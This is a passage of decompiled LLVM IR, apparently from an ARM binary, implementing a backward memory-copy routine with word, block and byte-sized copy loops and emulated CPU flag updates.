  store i32 %v2_15b00, i32* %r0.global-to-local, align 4
  %v2_15b04 = add i32 %v1_15afc, -4
  store i32 %v2_15b04, i32* %r2.global-to-local, align 4
  %v4_15b04 = sub i32 3, %v1_15afc
  %v5_15b04 = and i32 %v4_15b04, %v1_15afc
  %v6_15b04 = icmp slt i32 %v5_15b04, 0
  store i1 %v6_15b04, i1* %cpsr_v.global-to-local, align 1
  %v7_15b04 = icmp slt i32 %v2_15b04, 0
  store i1 %v7_15b04, i1* %cpsr_n.global-to-local, align 1
  %v8_15b04 = icmp eq i32 %v1_15afc, 4
  store i1 %v8_15b04, i1* %cpsr_z.global-to-local, align 1
  %v5_15b08 = icmp slt i32 %v1_15afc, 4
  br i1 %v5_15b08, label %bb141, label %dec_label_pc_15b0c

dec_label_pc_15b0c:                               ; preds = %dec_label_pc_15afc
  %v1_15b0c = urem i32 %v2_15b00, 4
  store i32 %v1_15b0c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15b0c = icmp eq i32 %v1_15b0c, 0
  store i1 %v2_15b0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b0c, label %dec_label_pc_15b14, label %dec_label_pc_15bb4

dec_label_pc_15b14:                               ; preds = %dec_label_pc_15b0c
  %v1_15b14 = urem i32 %v2_15afc, 4
  store i32 %v1_15b14, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15b14 = icmp eq i32 %v1_15b14, 0
  store i1 %v2_15b14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15b14, label %dec_label_pc_15b1c, label %dec_label_pc_15be0

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b14, %dec_label_pc_15bd8
  %v0_15b3448 = phi i32 [ %v2_15b00, %dec_label_pc_15b14 ], [ %v0_15c2831, %dec_label_pc_15bd8 ]
  %v0_15b3047 = phi i32 [ %v2_15afc, %dec_label_pc_15b14 ], [ %v0_15bd8, %dec_label_pc_15bd8 ]
  %v0_15b1c = phi i32 [ %v2_15b04, %dec_label_pc_15b14 ], [ %v2_15bd0, %dec_label_pc_15bd8 ]
  %v2_15b1c = add i32 %v0_15b1c, -8
  store i32 %v2_15b1c, i32* %r2.global-to-local, align 4
  %v4_15b1c = sub i32 7, %v0_15b1c
  %v5_15b1c = and i32 %v4_15b1c, %v0_15b1c
  %v6_15b1c = icmp slt i32 %v5_15b1c, 0
  store i1 %v6_15b1c, i1* %cpsr_v.global-to-local, align 1
  %v7_15b1c = icmp slt i32 %v2_15b1c, 0
  store i1 %v7_15b1c, i1* %cpsr_n.global-to-local, align 1
  %v8_15b1c = icmp eq i32 %v0_15b1c, 8
  store i1 %v8_15b1c, i1* %cpsr_z.global-to-local, align 1
  %v5_15b20 = icmp slt i32 %v0_15b1c, 8
  br i1 %v5_15b20, label %dec_label_pc_15b6c, label %dec_label_pc_15b24

dec_label_pc_15b24:                               ; preds = %dec_label_pc_15b1c
  %v3_15b24 = load i32, i32* @r4, align 4
  store i32 %v3_15b24, i32* %stack_var_-8, align 4
  %v6_15b24 = load i32, i32* @lr, align 4
  %v2_15b28 = add i32 %v0_15b1c, -28
  store i32 %v2_15b28, i32* %r2.global-to-local, align 4
  %v4_15b28 = sub i32 27, %v0_15b1c
  %v5_15b28 = and i32 %v4_15b28, %v2_15b1c
  %v6_15b28 = icmp slt i32 %v5_15b28, 0
  store i1 %v6_15b28, i1* %cpsr_v.global-to-local, align 1
  %v7_15b28 = icmp slt i32 %v2_15b28, 0
  store i1 %v7_15b28, i1* %cpsr_n.global-to-local, align 1
  %v8_15b28 = icmp eq i32 %v2_15b1c, 20
  store i1 %v8_15b28, i1* %cpsr_z.global-to-local, align 1
  %v5_15b2c = icmp slt i32 %v2_15b1c, 20
  br i1 %v5_15b2c, label %dec_label_pc_15b48, label %dec_label_pc_15b30

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b24, %dec_label_pc_15b30.dec_label_pc_15b30_crit_edge
  %v0_15b34 = phi i32 [ %v1_15b3c, %dec_label_pc_15b30.dec_label_pc_15b30_crit_edge ], [ %v0_15b3448, %dec_label_pc_15b24 ]
  %v0_15b30 = phi i32 [ %v0_15b30.pre, %dec_label_pc_15b30.dec_label_pc_15b30_crit_edge ], [ %v0_15b3047, %dec_label_pc_15b24 ]
  %v1_15b30 = add i32 %v0_15b30, -4
  %v2_15b30 = inttoptr i32 %v1_15b30 to i32*
  %v3_15b30 = load i32, i32* %v2_15b30, align 4
  store i32 %v3_15b30, i32* %r3.global-to-local, align 4
  %v4_15b30 = add i32 %v0_15b30, -8
  %v5_15b30 = inttoptr i32 %v4_15b30 to i32*
  %v6_15b30 = load i32, i32* %v5_15b30, align 4
  store i32 %v6_15b30, i32* %r4.global-to-local, align 4
  %v7_15b30 = add i32 %v0_15b30, -12
  %v8_15b30 = inttoptr i32 %v7_15b30 to i32*
  %v9_15b30 = load i32, i32* %v8_15b30, align 4
  store i32 %v9_15b30, i32* %ip.global-to-local, align 4
  %v10_15b30 = add i32 %v0_15b30, -16
  %v11_15b30 = inttoptr i32 %v10_15b30 to i32*
  %v12_15b30 = load i32, i32* %v11_15b30, align 4
  store i32 %v12_15b30, i32* %lr.global-to-local, align 4
  store i32 %v10_15b30, i32* %r1.global-to-local, align 4
  %v1_15b34 = add i32 %v0_15b34, -16
  %v2_15b34 = inttoptr i32 %v1_15b34 to i32*
  store i32 %v3_15b30, i32* %v2_15b34, align 4
  %v4_15b34 = add i32 %v0_15b34, -12
  %v5_15b34 = inttoptr i32 %v4_15b34 to i32*
  %v6_15b34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15b34, i32* %v5_15b34, align 4
  %v7_15b34 = add i32 %v0_15b34, -8
  %v8_15b34 = inttoptr i32 %v7_15b34 to i32*
  %v9_15b34 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15b34, i32* %v8_15b34, align 4
  %v10_15b34 = add i32 %v0_15b34, -4
  %v11_15b34 = inttoptr i32 %v10_15b34 to i32*
  %v12_15b34 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b34, i32* %v11_15b34, align 4
  store i32 %v1_15b34, i32* %r0.global-to-local, align 4
  %v0_15b38 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b38 = add i32 %v0_15b38, -4
  %v2_15b38 = inttoptr i32 %v1_15b38 to i32*
  %v3_15b38 = load i32, i32* %v2_15b38, align 4
  store i32 %v3_15b38, i32* %r3.global-to-local, align 4
  %v4_15b38 = add i32 %v0_15b38, -8
  %v5_15b38 = inttoptr i32 %v4_15b38 to i32*
  %v6_15b38 = load i32, i32* %v5_15b38, align 4
  store i32 %v6_15b38, i32* %r4.global-to-local, align 4
  %v7_15b38 = add i32 %v0_15b38, -12
  %v8_15b38 = inttoptr i32 %v7_15b38 to i32*
  %v9_15b38 = load i32, i32* %v8_15b38, align 4
  store i32 %v9_15b38, i32* @ip, align 4
  %v10_15b38 = add i32 %v0_15b38, -16
  %v11_15b38 = inttoptr i32 %v10_15b38 to i32*
  %v12_15b38 = load i32, i32* %v11_15b38, align 4
  store i32 %v12_15b38, i32* %lr.global-to-local, align 4
  store i32 %v10_15b38, i32* %r1.global-to-local, align 4
  %v1_15b3c = add i32 %v0_15b34, -32
  %v2_15b3c = inttoptr i32 %v1_15b3c to i32*
  store i32 %v3_15b38, i32* %v2_15b3c, align 4
  %v4_15b3c = add i32 %v0_15b34, -28
  %v5_15b3c = inttoptr i32 %v4_15b3c to i32*
  %v6_15b3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15b3c, i32* %v5_15b3c, align 4
  %v7_15b3c = add i32 %v0_15b34, -24
  %v8_15b3c = inttoptr i32 %v7_15b3c to i32*
  %v9_15b3c = load i32, i32* @ip, align 4
  store i32 %v9_15b3c, i32* %v8_15b3c, align 4
  %v10_15b3c = add i32 %v0_15b34, -20
  %v11_15b3c = inttoptr i32 %v10_15b3c to i32*
  %v12_15b3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15b3c, i32* %v11_15b3c, align 4
  store i32 %v1_15b3c, i32* %r0.global-to-local, align 4
  %v0_15b40 = load i32, i32* %r2.global-to-local, align 4
  %v2_15b40 = add i32 %v0_15b40, -32
  store i32 %v2_15b40, i32* %r2.global-to-local, align 4
  %v6_15b44 = icmp slt i32 %v0_15b40, 32
  br i1 %v6_15b44, label %dec_label_pc_15b48.loopexit, label %dec_label_pc_15b30.dec_label_pc_15b30_crit_edge

dec_label_pc_15b30.dec_label_pc_15b30_crit_edge:  ; preds = %dec_label_pc_15b30
  %v0_15b30.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15b30

dec_label_pc_15b48.loopexit:                      ; preds = %dec_label_pc_15b30
  %v4_15b40 = sub i32 31, %v0_15b40
  %v5_15b40 = and i32 %v4_15b40, %v0_15b40
  %v6_15b40 = icmp slt i32 %v5_15b40, 0
  %v7_15b40 = icmp slt i32 %v2_15b40, 0
  store i1 %v6_15b40, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15b40, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15b48

dec_label_pc_15b48:                               ; preds = %dec_label_pc_15b48.loopexit, %dec_label_pc_15b24
  %v6_15b50 = phi i32 [ %v1_15b3c, %dec_label_pc_15b48.loopexit ], [ %v0_15b3448, %dec_label_pc_15b24 ]
  %v0_15b58.pr = phi i32 [ %v2_15b40, %dec_label_pc_15b48.loopexit ], [ %v2_15b28, %dec_label_pc_15b24 ]
  %v4_15b48 = add i32 %v0_15b58.pr, 16
  %v6_15b48 = sub i32 0, %v0_15b58.pr
  %v7_15b48 = and i32 %v4_15b48, %v6_15b48
  %v8_15b48 = icmp slt i32 %v7_15b48, 0
  store i1 %v8_15b48, i1* %cpsr_v.global-to-local, align 1
  %v9_15b48 = icmp slt i32 %v4_15b48, 0
  store i1 %v9_15b48, i1* %cpsr_n.global-to-local, align 1
  %v10_15b48 = icmp eq i32 %v4_15b48, 0
  store i1 %v10_15b48, i1* %cpsr_z.global-to-local, align 1
  %v5_15b4c = icmp slt i32 %v0_15b58.pr, -16
  br i1 %v5_15b4c, label %.thread13, label %bb138

bb138:                                            ; preds = %dec_label_pc_15b48
  %v6_15b4c = load i32, i32* %r1.global-to-local, align 4
  %v7_15b4c = add i32 %v6_15b4c, -4
  %v8_15b4c = inttoptr i32 %v7_15b4c to i32*
  %v9_15b4c = load i32, i32* %v8_15b4c, align 4
  store i32 %v9_15b4c, i32* %r3.global-to-local, align 4
  %v10_15b4c = add i32 %v6_15b4c, -8
  %v11_15b4c = inttoptr i32 %v10_15b4c to i32*
  %v12_15b4c = load i32, i32* %v11_15b4c, align 4
  store i32 %v12_15b4c, i32* %r4.global-to-local, align 4
  %v13_15b4c = add i32 %v6_15b4c, -12
  %v14_15b4c = inttoptr i32 %v13_15b4c to i32*
  %v15_15b4c = load i32, i32* %v14_15b4c, align 4
  store i32 %v15_15b4c, i32* @ip, align 4
  %v16_15b4c = add i32 %v6_15b4c, -16
  %v17_15b4c = inttoptr i32 %v16_15b4c to i32*
  %v18_15b4c = load i32, i32* %v17_15b4c, align 4
  store i32 %v18_15b4c, i32* %lr.global-to-local, align 4
  store i32 %v16_15b4c, i32* %r1.global-to-local, align 4
  %v7_15b50 = add i32 %v6_15b50, -16
  %v8_15b50 = inttoptr i32 %v7_15b50 to i32*
  store i32 %v9_15b4c, i32* %v8_15b50, align 4
  %v10_15b50 = add i32 %v6_15b50, -12
  %v11_15b50 = inttoptr i32 %v10_15b50 to i32*
  %v12_15b50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15b50, i32* %v11_15b50, align 4
  %v13_15b50 = add i32 %v6_15b50, -8
  %v14_15b50 = inttoptr i32 %v13_15b50 to i32*
  %v15_15b50 = load i32, i32* @ip, align 4
  store i32 %v15_15b50, i32* %v14_15b50, align 4
  %v16_15b50 = add i32 %v6_15b50, -4
  %v17_15b50 = inttoptr i32 %v16_15b50 to i32*
  %v18_15b50 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15b50, i32* %v17_15b50, align 4
  store i32 %v7_15b50, i32* %r0.global-to-local, align 4
  %v6_15b54 = load i32, i32* %r2.global-to-local, align 4
  %v7_15b54 = add i32 %v6_15b54, -16
  store i32 %v7_15b54, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_15b48, %bb138
  %v6_15b60 = phi i32 [ %v7_15b50, %bb138 ], [ %v6_15b50, %dec_label_pc_15b48 ]
  %v0_15b58 = phi i32 [ %v7_15b54, %bb138 ], [ %v0_15b58.pr, %dec_label_pc_15b48 ]
  %v4_15b58 = add i32 %v0_15b58, 20
  store i32 %v4_15b58, i32* %r2.global-to-local, align 4
  %v6_15b58 = sub i32 0, %v0_15b58
  %v7_15b58 = and i32 %v4_15b58, %v6_15b58
  %v8_15b58 = icmp slt i32 %v7_15b58, 0
  store i1 %v8_15b58, i1* %cpsr_v.global-to-local, align 1
  %v9_15b58 = icmp slt i32 %v4_15b58, 0
  store i1 %v9_15b58, i1* %cpsr_n.global-to-local, align 1
  %v10_15b58 = icmp eq i32 %v4_15b58, 0
  store i1 %v10_15b58, i1* %cpsr_z.global-to-local, align 1
  %v5_15b5c = icmp slt i32 %v0_15b58, -20
  br i1 %v5_15b5c, label %.thread15, label %bb139

bb139:                                            ; preds = %.thread13
  %v6_15b5c = load i32, i32* %r1.global-to-local, align 4
  %v7_15b5c = add i32 %v6_15b5c, -4
  %v8_15b5c = inttoptr i32 %v7_15b5c to i32*
  %v9_15b5c = load i32, i32* %v8_15b5c, align 4
  store i32 %v9_15b5c, i32* %r3.global-to-local, align 4
  %v10_15b5c = add i32 %v6_15b5c, -8
  %v11_15b5c = inttoptr i32 %v10_15b5c to i32*
  %v12_15b5c = load i32, i32* %v11_15b5c, align 4
  store i32 %v12_15b5c, i32* @ip, align 4
  %v13_15b5c = add i32 %v6_15b5c, -12
  %v14_15b5c = inttoptr i32 %v13_15b5c to i32*
  %v15_15b5c = load i32, i32* %v14_15b5c, align 4
  store i32 %v15_15b5c, i32* %lr.global-to-local, align 4
  store i32 %v13_15b5c, i32* %r1.global-to-local, align 4
  %v7_15b60 = add i32 %v6_15b60, -12
  %v8_15b60 = inttoptr i32 %v7_15b60 to i32*
  store i32 %v9_15b5c, i32* %v8_15b60, align 4
  %v10_15b60 = add i32 %v6_15b60, -8
  %v11_15b60 = inttoptr i32 %v10_15b60 to i32*
  %v12_15b60 = load i32, i32* @ip, align 4
  store i32 %v12_15b60, i32* %v11_15b60, align 4
  %v13_15b60 = add i32 %v6_15b60, -4
  %v14_15b60 = inttoptr i32 %v13_15b60 to i32*
  %v15_15b60 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15b60, i32* %v14_15b60, align 4
  store i32 %v7_15b60, i32* %r0.global-to-local, align 4
  %v6_15b64 = load i32, i32* %r2.global-to-local, align 4
  %v7_15b64 = add i32 %v6_15b64, -12
  store i32 %v7_15b64, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb139
  %v6_15b8456 = phi i32 [ %v6_15b60, %.thread13 ], [ %v7_15b60, %bb139 ]
  %v0_15b6c54 = phi i32 [ %v4_15b58, %.thread13 ], [ %v7_15b64, %bb139 ]
  %v2_15b68 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15b68, i32* @r4, align 4
  store i32 %v6_15b24, i32* @lr, align 4
  br label %dec_label_pc_15b6c

dec_label_pc_15b6c:                               ; preds = %dec_label_pc_15b1c, %.thread15
  %v7_15b7c = phi i32 [ %v0_15b3448, %dec_label_pc_15b1c ], [ %v6_15b8456, %.thread15 ]
  %v0_15b6c = phi i32 [ %v2_15b1c, %dec_label_pc_15b1c ], [ %v0_15b6c54, %.thread15 ]
  %v2_15b6c = add i32 %v0_15b6c, 8
  store i32 %v2_15b6c, i32* %r2.global-to-local, align 4
  %v4_15b6c = sub i32 0, %v0_15b6c
  %v5_15b6c = and i32 %v2_15b6c, %v4_15b6c
  %v6_15b6c = icmp slt i32 %v5_15b6c, 0
  store i1 %v6_15b6c, i1* %cpsr_v.global-to-local, align 1
  %v7_15b6c = icmp slt i32 %v2_15b6c, 0
  store i1 %v7_15b6c, i1* %cpsr_n.global-to-local, align 1
  %v8_15b6c = icmp eq i32 %v2_15b6c, 0
  store i1 %v8_15b6c, i1* %cpsr_z.global-to-local, align 1
  %v5_15b70 = icmp slt i32 %v0_15b6c, -8
  br i1 %v5_15b70, label %bb141, label %dec_label_pc_15b74

dec_label_pc_15b74:                               ; preds = %dec_label_pc_15b6c
  %v6_15b74 = add i32 %v0_15b6c, 4
  store i32 %v6_15b74, i32* %r2.global-to-local, align 4
  %v8_15b74 = sub i32 -5, %v0_15b6c
  %v9_15b74 = and i32 %v8_15b74, %v2_15b6c
  %v10_15b74 = icmp slt i32 %v9_15b74, 0
  store i1 %v10_15b74, i1* %cpsr_v.global-to-local, align 1
  %v11_15b74 = icmp slt i32 %v6_15b74, 0
  store i1 %v11_15b74, i1* %cpsr_n.global-to-local, align 1
  %v12_15b74 = icmp eq i32 %v2_15b6c, 4
  store i1 %v12_15b74, i1* %cpsr_z.global-to-local, align 1
  %v5_15b78 = icmp slt i32 %v2_15b6c, 4
  %v6_15b78 = load i32, i32* %r1.global-to-local, align 4
  %v7_15b78 = add i32 %v6_15b78, -4
  %v8_15b78 = inttoptr i32 %v7_15b78 to i32*
  %v9_15b78 = load i32, i32* %v8_15b78, align 4
  store i32 %v9_15b78, i32* %r3.global-to-local, align 4
  br i1 %v5_15b78, label %.thread19, label %bb140

.thread19:                                        ; preds = %dec_label_pc_15b74
  store i32 %v7_15b78, i32* %r1.global-to-local, align 4
  %v8_15b7c = add i32 %v7_15b7c, -4
  %v9_15b7c = inttoptr i32 %v8_15b7c to i32*
  store i32 %v9_15b78, i32* %v9_15b7c, align 4
  %v10_15b7c = load i32, i32* %r0.global-to-local, align 4
  %v11_15b7c = add i32 %v10_15b7c, -4
  store i32 %v11_15b7c, i32* %r0.global-to-local, align 4
  %v0_15b8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_15b74
  %v10_15b80 = add i32 %v6_15b78, -8
  %v11_15b80 = inttoptr i32 %v10_15b80 to i32*
  %v12_15b80 = load i32, i32* %v11_15b80, align 4
  store i32 %v12_15b80, i32* @ip, align 4
  store i32 %v10_15b80, i32* %r1.global-to-local, align 4
  %v7_15b84 = add i32 %v7_15b7c, -8
  %v8_15b84 = inttoptr i32 %v7_15b84 to i32*
  store i32 %v9_15b78, i32* %v8_15b84, align 4
  %v10_15b84 = add i32 %v7_15b7c, -4
  %v11_15b84 = inttoptr i32 %v10_15b84 to i32*
  %v12_15b84 = load i32, i32* @ip, align 4
  store i32 %v12_15b84, i32* %v11_15b84, align 4
  store i32 %v7_15b84, i32* %r0.global-to-local, align 4
  %v6_15b88 = load i32, i32* %r2.global-to-local, align 4
  %v7_15b88 = add i32 %v6_15b88, -4
  store i32 %v7_15b88, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_15afc, %dec_label_pc_15b6c, %dec_label_pc_15d30, %dec_label_pc_15cc4, %dec_label_pc_15c58, %bb140
  %v2_15b90 = phi i32 [ %v11_15b7c, %.thread19 ], [ %v0_15c2831, %.thread25 ], [ %v2_15b00, %dec_label_pc_15afc ], [ %v7_15b7c, %dec_label_pc_15b6c ], [ %v2_15b9c64, %dec_label_pc_15d30 ], [ %v2_15b9c63, %dec_label_pc_15cc4 ], [ %v2_15b9c62, %dec_label_pc_15c58 ], [ %v7_15b84, %bb140 ]
  %v0_15b8c = phi i32 [ %v0_15b8c.pre, %.thread19 ], [ %v2_15bd0, %.thread25 ], [ %v2_15b04, %dec_label_pc_15afc ], [ %v2_15b6c, %dec_label_pc_15b6c ], [ %v0_15b8c60, %dec_label_pc_15d30 ], [ %v0_15b8c59, %dec_label_pc_15cc4 ], [ %v0_15b8c58, %dec_label_pc_15c58 ], [ %v7_15b88, %bb140 ]
  %v1_15b8c = add i32 %v0_15b8c, 4
  store i32 %v1_15b8c, i32* %r2.global-to-local, align 4
  %v3_15b8c = sub i32 0, %v0_15b8c
  %v4_15b8c = and i32 %v1_15b8c, %v3_15b8c
  %v5_15b8c = icmp slt i32 %v4_15b8c, 0
  store i1 %v5_15b8c, i1* %cpsr_v.global-to-local, align 1
  %v6_15b8c = icmp slt i32 %v1_15b8c, 0
  store i1 %v6_15b8c, i1* %cpsr_n.global-to-local, align 1
  %v7_15b8c = icmp eq i32 %v1_15b8c, 0
  store i1 %v7_15b8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15b8c, label %.thread122, label %bb142

bb142:                                            ; preds = %bb141
  %v1_15b94 = add i32 %v0_15b8c, 2
  %v3_15b94 = sub i32 -3, %v0_15b8c
  %v4_15b94 = and i32 %v3_15b94, %v1_15b8c
  %v5_15b94 = icmp slt i32 %v4_15b94, 0
  store i1 %v5_15b94, i1* %cpsr_v.global-to-local, align 1
  %v6_15b94 = icmp slt i32 %v1_15b94, 0
  store i1 %v6_15b94, i1* %cpsr_n.global-to-local, align 1
  %v7_15b94 = icmp eq i32 %v1_15b8c, 2
  store i1 %v7_15b94, i1* %cpsr_z.global-to-local, align 1
  %v0_15b98 = load i32, i32* %r1.global-to-local, align 4
  %v1_15b98 = add i32 %v0_15b98, -1
  %v2_15b98 = inttoptr i32 %v1_15b98 to i8*
  %v3_15b98 = load i8, i8* %v2_15b98, align 1
  %v4_15b98 = zext i8 %v3_15b98 to i32
  store i32 %v4_15b98, i32* %r3.global-to-local, align 4
  store i32 %v1_15b98, i32* %r1.global-to-local, align 4
  %v3_15b9c = add i32 %v2_15b90, -1
  %v4_15b9c = inttoptr i32 %v3_15b9c to i8*
  store i8 %v3_15b98, i8* %v4_15b9c, align 1
  %v5_15b9c = load i32, i32* %r0.global-to-local, align 4
  %v6_15b9c = add i32 %v5_15b9c, -1
  store i32 %v6_15b9c, i32* %r0.global-to-local, align 4
  %v0_15ba0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_15ba0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_15ba0 = xor i1 %v0_15ba0, %v1_15ba0
  br i1 %v2_15ba0, label %.thread121, label %bb143

bb143:                                            ; preds = %bb142
  %v3_15ba0 = load i32, i32* %r1.global-to-local, align 4
  %v4_15ba0 = add i32 %v3_15ba0, -1
  %v5_15ba0 = inttoptr i32 %v4_15ba0 to i8*
  %v6_15ba0 = load i8, i8* %v5_15ba0, align 1
  %v7_15ba0 = zext i8 %v6_15ba0 to i32
  store i32 %v7_15ba0, i32* %r3.global-to-local, align 4
  store i32 %v4_15ba0, i32* %r1.global-to-local, align 4
  %v6_15ba4 = add i32 %v5_15b9c, -2
  %v7_15ba4 = inttoptr i32 %v6_15ba4 to i8*
  store i8 %v6_15ba0, i8* %v7_15ba4, align 1
  %v8_15ba4 = load i32, i32* %r0.global-to-local, align 4
  %v9_15ba4 = add i32 %v8_15ba4, -1
  store i32 %v9_15ba4, i32* %r0.global-to-local, align 4
  %v1_15ba8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_15ba8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb142, %bb143
  %v7_15bac = phi i32 [ %v9_15ba4, %bb143 ], [ %v6_15b9c, %bb142 ]
  %v2_15bac = phi i1 [ %v2_15ba8.pre, %bb143 ], [ %v1_15ba0, %bb142 ]
  %v1_15bac = phi i1 [ %v1_15ba8.pre, %bb143 ], [ %v0_15ba0, %bb142 ]
  %v0_15ba8 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_15ba8 = xor i1 %v2_15bac, %v1_15bac
  %v4_15ba8 = or i1 %v0_15ba8, %v3_15ba8
  br i1 %v4_15ba8, label %.thread122, label %bb144

bb144:                                            ; preds = %.thread121
  %v5_15ba8 = load i32, i32* %r1.global-to-local, align 4
  %v6_15ba8 = add i32 %v5_15ba8, -1
  %v7_15ba8 = inttoptr i32 %v6_15ba8 to i8*
  %v8_15ba8 = load i8, i8* %v7_15ba8, align 1
  %v9_15ba8 = zext i8 %v8_15ba8 to i32
  store i32 %v9_15ba8, i32* %r3.global-to-local, align 4
  store i32 %v6_15ba8, i32* %r1.global-to-local, align 4
  %v8_15bac = add i32 %v7_15bac, -1
  %v9_15bac = inttoptr i32 %v8_15bac to i8*
  store i8 %v8_15ba8, i8* %v9_15bac, align 1
  %v10_15bac = load i32, i32* %r0.global-to-local, align 4
  %v11_15bac = add i32 %v10_15bac, -1
  store i32 %v11_15bac, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_15bb4:                               ; preds = %dec_label_pc_15b0c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_15bb4 = icmp eq i32 %v1_15b0c, 1
  store i1 %v8_15bb4, i1* %cpsr_n.global-to-local, align 1
  %v9_15bb4 = icmp eq i32 %v1_15b0c, 2
  store i1 %v9_15bb4, i1* %cpsr_z.global-to-local, align 1
  %v1_15bb8 = add i32 %v2_15afc, -1
  %v2_15bb8 = inttoptr i32 %v1_15bb8 to i8*
  %v3_15bb8 = load i8, i8* %v2_15bb8, align 1
  %v4_15bb8 = zext i8 %v3_15bb8 to i32
  store i32 %v4_15bb8, i32* %r3.global-to-local, align 4
  store i32 %v1_15bb8, i32* %r1.global-to-local, align 4
  %v3_15bbc = add i32 %v2_15b00, -1
  %v4_15bbc = inttoptr i32 %v3_15bbc to i8*
  store i8 %v3_15bb8, i8* %v4_15bbc, align 1
  %v5_15bbc = load i32, i32* %r0.global-to-local, align 4
  %v6_15bbc = add i32 %v5_15bbc, -1
  store i32 %v6_15bbc, i32* %r0.global-to-local, align 4
  br i1 %v8_15bb4, label %.thread25, label %bb145

bb145:                                            ; preds = %dec_label_pc_15bb4
  %v6_15bc0 = load i32, i32* %r1.global-to-local, align 4
  %v7_15bc0 = add i32 %v6_15bc0, -1
  %v8_15bc0 = inttoptr i32 %v7_15bc0 to i8*
  %v9_15bc0 = load i8, i8* %v8_15bc0, align 1
  %v10_15bc0 = zext i8 %v9_15bc0 to i32
  store i32 %v10_15bc0, i32* %r3.global-to-local, align 4
  store i32 %v7_15bc0, i32* %r1.global-to-local, align 4
  %v9_15bc4 = add i32 %v5_15bbc, -2
  %v10_15bc4 = inttoptr i32 %v9_15bc4 to i8*
  store i8 %v9_15bc0, i8* %v10_15bc4, align 1
  %v11_15bc4 = load i32, i32* %r0.global-to-local, align 4
  %v12_15bc4 = add i32 %v11_15bc4, -1
  store i32 %v12_15bc4, i32* %r0.global-to-local, align 4
  br i1 %v9_15bb4, label %.thread25, label %bb146

bb146:                                            ; preds = %bb145
  %v8_15bc8 = load i32, i32* %r1.global-to-local, align 4
  %v9_15bc8 = add i32 %v8_15bc8, -1
  %v10_15bc8 = inttoptr i32 %v9_15bc8 to i8*
  %v11_15bc8 = load i8, i8* %v10_15bc8, align 1
  %v12_15bc8 = zext i8 %v11_15bc8 to i32
  store i32 %v12_15bc8, i32* %r3.global-to-local, align 4
  store i32 %v9_15bc8, i32* %r1.global-to-local, align 4
  %v11_15bcc = add i32 %v11_15bc4, -2
  %v12_15bcc = inttoptr i32 %v11_15bcc to i8*
  store i8 %v11_15bc8, i8* %v12_15bcc, align 1
  %v13_15bcc = load i32, i32* %r0.global-to-local, align 4
  %v14_15bcc = add i32 %v13_15bcc, -1
  store i32 %v14_15bcc, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb145, %dec_label_pc_15bb4, %bb146
  %v0_15c2831 = phi i32 [ %v12_15bc4, %bb145 ], [ %v6_15bbc, %dec_label_pc_15bb4 ], [ %v14_15bcc, %bb146 ]
  %v0_15bd0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15bd0 = load i32, i32* @ip, align 4
  %v2_15bd0 = sub i32 %v0_15bd0, %v1_15bd0
  store i32 %v2_15bd0, i32* %r2.global-to-local, align 4
  %v4_15bd0 = xor i32 %v1_15bd0, %v0_15bd0
  %v5_15bd0 = xor i32 %v2_15bd0, %v0_15bd0
  %v6_15bd0 = and i32 %v5_15bd0, %v4_15bd0
  %v7_15bd0 = icmp slt i32 %v6_15bd0, 0
  store i1 %v7_15bd0, i1* %cpsr_v.global-to-local, align 1
  %v8_15bd0 = icmp slt i32 %v2_15bd0, 0
  store i1 %v8_15bd0, i1* %cpsr_n.global-to-local, align 1
  %v9_15bd0 = icmp eq i32 %v0_15bd0, %v1_15bd0
  store i1 %v9_15bd0, i1* %cpsr_z.global-to-local, align 1
  %v5_15bd4 = icmp slt i32 %v0_15bd0, %v1_15bd0
  br i1 %v5_15bd4, label %bb141, label %dec_label_pc_15bd8

dec_label_pc_15bd8:                               ; preds = %.thread25
  %v0_15bd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15bd8 = urem i32 %v0_15bd8, 4
  store i32 %v1_15bd8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15bd8 = icmp eq i32 %v1_15bd8, 0
  store i1 %v2_15bd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15bd8, label %dec_label_pc_15b1c, label %dec_label_pc_15be0

dec_label_pc_15be0:                               ; preds = %dec_label_pc_15b14, %dec_label_pc_15bd8
  %v0_15c2830 = phi i32 [ %v2_15b00, %dec_label_pc_15b14 ], [ %v0_15c2831, %dec_label_pc_15bd8 ]
